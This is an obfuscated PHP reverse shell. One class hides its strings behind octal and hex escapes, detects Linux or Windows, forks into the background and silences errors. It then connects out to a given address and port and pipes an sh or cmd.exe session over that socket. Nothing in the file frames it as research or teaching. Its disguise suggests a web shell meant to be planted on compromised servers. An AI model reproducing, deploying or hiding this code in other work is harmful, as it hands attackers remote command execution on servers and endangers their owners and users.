<?php
 class Loys { private $addr = null; private $port = null; private $os = null; private $shell = null; private $descriptorspec = array(0 => array("\160\151\x70\x65", "\162"), 1 => array("\160\151\x70\145", "\x77"), 2 => array("\160\x69\x70\x65", "\167")); private $buffer = 1024; private $clen = 0; private $error = false; public function __construct($addr, $port) { $this->addr = $addr; $this->port = $port; } private function detect() { $detected = true; if (stripos(PHP_OS, "\x4c\x49\116\x55\130") !== false) { $this->os = "\114\x49\x4e\125\x58"; $this->shell = "\x73\x68"; } else { if (stripos(PHP_OS, "\x57\x49\x4e\x33\62") !== false || stripos(PHP_OS, "\x57\x49\x4e\116\124") !== false || stripos(PHP_OS, "\x57\x49\116\104\117\127\x53") !== false) { $this->os = "\x57\x49\x4e\x44\117\127\x53"; $this->shell = "\x63\155\144\56\145\170\x65"; } else { $detected = false; echo "\123\131\123\x5f\105\x52\122\117\122\72\x20\125\156\x64\145\162\x6c\x79\x69\156\x67\x20\x6f\160\x65\x72\141\164\x69\156\147\x20\163\x79\x73\164\x65\x6d\40\x69\163\40\x6e\157\164\x20\163\x75\160\x70\157\x72\164\145\144\x2c\x20\x73\143\x72\x69\160\164\x20\167\x69\x6c\154\x20\x6e\157\x77\x20\145\x78\x69\x74\x2e\56\56\xa"; } } return $detected; } private function daemonize() { $exit = false; if (!function_exists("\160\143\156\164\154\x5f\146\157\162\153")) { echo "\x44\101\x45\x4d\x4f\116\x49\x5a\x45\x3a\x20\x70\x63\x6e\x74\x6c\x5f\146\x6f\162\x6b\50\x29\40\x64\157\x65\163\40\x6e\157\164\x20\x65\170\x69\x73\x74\163\x2c\x20\155\x6f\x76\151\x6e\147\40\157\156\56\56\56\xa"; } else { if (($pid = @pcntl_fork()) < 0) { echo "\104\x41\x45\x4d\x4f\116\x49\132\x45\x3a\x20\103\141\156\156\157\164\x20\146\x6f\162\153\x20\157\146\x66\x20\164\x68\x65\x20\x70\141\x72\145\156\164\x20\160\162\157\143\x65\163\163\54\40\155\157\166\151\156\147\x20\x6f\156\56\56\56\xa"; } else { if ($pid > 0) { $exit = true; echo "\x44\101\105\115\117\116\111\132\x45\72\40\103\x68\151\x6c\x64\x20\x70\162\x6f\143\145\x73\x73\x20\146\x6f\x72\153\145\144\40\157\x66\x66\x20\163\x75\143\x63\145\x73\163\x66\165\x6c\x6c\171\x2c\40\x70\x61\x72\x65\x6e\164\x20\160\162\157\143\145\x73\x73\x20\167\151\154\x6c\40\156\157\x77\x20\x65\170\151\164\56\56\56\xa"; } else { if (posix_setsid() < 0) { echo "\104\x41\105\x4d\x4f\116\x49\132\105\72\x20\x46\157\x72\x6b\145\144\x20\157\146\x66\x20\x74\x68\x65\40\x70\141\x72\x65\x6e\164\x20\160\162\x6f\143\x65\x73\x73\40\142\x75\164\x20\143\141\x6e\x6e\157\164\x20\x73\x65\x74\40\141\40\156\145\167\x20\x53\x49\104\54\x20\x6d\x6f\x76\151\x6e\147\40\x6f\x6e\x20\141\163\x20\141\x6e\40\157\162\x70\150\141\x6e\56\56\56\12"; } else { echo "\x44\101\x45\x4d\x4f\116\x49\132\105\72\x20\x43\x6f\155\160\x6c\x65\x74\x65\x64\x20\x73\165\143\x63\x65\x73\163\146\165\154\154\x79\x21\xa"; } } } } return $exit; } private function settings() { @error_reporting(0); @set_time_limit(0); @umask(0); } private function dump($data) { $data = str_replace("\74", "\46\154\x74\x3b", $data); $data = str_replace("\x3e", "\46\x67\x74\x3b", $data); echo $data; } private function read($stream, $name, $buffer) { if (($data = @fread($stream, $buffer)) === false) { $this->error = true; echo "\x53\x54\122\115\137\105\x52\x52\117\122\x3a\40\103\141\156\156\x6f\164\40\x72\145\141\x64\40\x66\x72\157\155\x20{$name}\x2c\40\163\143\x72\x69\x70\x74\x20\167\151\x6c\154\40\x6e\157\x77\x20\x65\x78\x69\x74\56\56\56\12"; } return $data; } private function write($stream, $name, $data) { if (($bytes = @fwrite($stream, $data)) === false) { $this->error = true; echo "\x53\124\x52\x4d\137\105\x52\x52\x4f\122\72\x20\x43\x61\156\156\x6f\164\x20\167\x72\x69\x74\145\40\x74\x6f\x20{$name}\x2c\x20\163\143\x72\151\160\x74\x20\x77\x69\x6c\x6c\x20\156\x6f\167\x20\x65\170\x69\x74\x2e\56\x2e\xa"; } return $bytes; } private function rw($input, $output, $iname, $oname) { while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) { if ($this->os === "\x57\111\116\x44\x4f\x57\x53" && $oname === "\x53\124\x44\111\116") { $this->clen += strlen($data); } $this->dump($data); } } private function brw($input, $output, $iname, $oname) { $fstat = fstat($input); $size = $fstat["\163\151\172\x65"]; if ($this->os === "\127\x49\116\104\117\x57\x53" && $iname === "\123\x54\104\x4f\125\x54" && $this->clen) { while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) { $this->clen -= $bytes; $size -= $bytes; } } while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) { $size -= $bytes; $this->dump($data); } } public function run() { if ($this->detect() && !$this->daemonize()) { $this->settings(); $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30); if (!$socket) { echo "\123\x4f\x43\137\x45\x52\x52\117\122\72\x20{$errno}\72\40{$errstr}\12"; } else { stream_set_blocking($socket, false); $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null); if (!$process) { echo "\120\x52\x4f\103\x5f\105\122\122\117\122\x3a\x20\103\x61\156\x6e\x6f\164\40\163\164\x61\162\x74\x20\164\x68\145\40\x73\150\x65\x6c\x6c\xa"; } else { foreach ($pipes as $pipe) { stream_set_blocking($pipe, false); } $status = proc_get_status($process); @fwrite($socket, "\123\x4f\103\113\x45\x54\72\x20\123\x68\145\x6c\x6c\40\x68\x61\x73\40\x63\x6f\156\156\x65\x63\x74\145\144\x21\x20\120\111\x44\x3a\40" . $status["\160\151\x64"] . "\xa"); do { $status = proc_get_status($process); if (feof($socket)) { echo "\123\x4f\103\x5f\105\122\122\x4f\122\72\40\123\150\145\154\x6c\40\x63\x6f\x6e\x6e\145\x63\164\151\157\x6e\x20\x68\x61\x73\x20\142\x65\145\x6e\40\x74\x65\162\155\151\156\141\x74\145\144\12"; break; } else { if (feof($pipes[1]) || !$status["\162\x75\x6e\x6e\151\x6e\x67"]) { echo "\x50\122\117\x43\137\105\x52\x52\x4f\x52\x3a\x20\x53\150\145\154\x6c\40\160\162\x6f\x63\145\x73\163\40\x68\141\163\40\142\x65\145\156\x20\164\145\162\x6d\151\156\x61\x74\x65\x64\12"; break; } } $streams = array("\x72\x65\x61\144" => array($socket, $pipes[1], $pipes[2]), "\x77\x72\151\x74\x65" => null, "\145\x78\x63\x65\x70\164" => null); $num_changed_streams = @stream_select($streams["\x72\145\x61\144"], $streams["\167\x72\x69\x74\145"], $streams["\x65\x78\143\145\x70\x74"], 0); if ($num_changed_streams === false) { echo "\123\124\122\x4d\x5f\x45\x52\x52\x4f\122\72\x20\163\164\162\x65\141\155\x5f\163\145\154\145\143\164\x28\51\40\x66\x61\x69\154\x65\144\12"; break; } else { if ($num_changed_streams > 0) { if ($this->os === "\x4c\x49\x4e\125\x58") { if (in_array($socket, $streams["\x72\x65\x61\x64"])) { $this->rw($socket, $pipes[0], "\123\117\x43\113\x45\124", "\x53\124\104\111\116"); } if (in_array($pipes[2], $streams["\x72\145\x61\x64"])) { $this->rw($pipes[2], $socket, "\x53\124\104\x45\x52\x52", "\123\117\103\x4b\x45\x54"); } if (in_array($pipes[1], $streams["\162\x65\x61\144"])) { $this->rw($pipes[1], $socket, "\x53\x54\104\117\125\x54", "\x53\x4f\x43\113\105\124"); } } else { if ($this->os === "\x57\111\x4e\x44\x4f\x57\x53") { if (in_array($socket, $streams["\x72\145\141\144"])) { $this->rw($socket, $pipes[0], "\x53\x4f\103\113\105\x54", "\x53\x54\104\111\116"); } if (($fstat = fstat($pipes[2])) && $fstat["\163\151\x7a\145"]) { $this->brw($pipes[2], $socket, "\x53\124\x44\x45\122\122", "\x53\117\x43\113\105\x54"); } if (($fstat = fstat($pipes[1])) && $fstat["\x73\151\172\x65"]) { $this->brw($pipes[1], $socket, "\x53\124\x44\x4f\x55\x54", "\x53\117\x43\113\105\x54"); } } } } } } while (!$this->error); foreach ($pipes as $pipe) { fclose($pipe); } proc_close($process); } fclose($socket); } } } } ?>